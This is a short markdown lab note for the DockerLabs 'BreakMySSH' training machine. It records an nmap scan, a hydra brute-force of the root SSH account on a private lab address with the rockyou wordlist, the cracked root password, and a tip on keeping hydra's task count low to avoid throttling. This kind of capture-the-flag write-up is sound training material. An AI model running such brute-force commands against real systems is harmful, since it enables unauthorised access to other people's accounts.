---
type: machine
platform: dockerlabs
difficulty: super-easy
ip: 172.17.0.2
cves: []
tools: [nmap, hydra]
techniques: [ssh-bruteforce]
tags: [ejpt:assessment, ejpt:host-net-pentest]
related: [[hedgehog]], [[trust]]
---

# BreakMySSH

**Writeup:** [raw writeup](../../writeups/dockerlabs/super-easy/break-my-ssh.md)

Straightforward SSH [[ssh-bruteforce|brute-force]] box. Only port 22 (OpenSSH 7.7) is open.

## Path

1. **Recon** — `ping` + `nmap -sV -sC -Pn -p-` → single open port `22/tcp ssh`.
2. **Brute force** — `hydra -l root -P rockyou.txt ssh://172.17.0.2 -t 4` cracks the root password in seconds.
3. **Root** — login as `root` with the recovered password.

## Credentials

| Service | User | Password |
|---------|------|----------|
| SSH | root | `estrella` |

## Takeaways

- A box with only SSH open and a weak root password is a classic [[ssh-bruteforce]] target.
- Keep hydra task count low (`-t 4`) against SSH to avoid connection throttling.
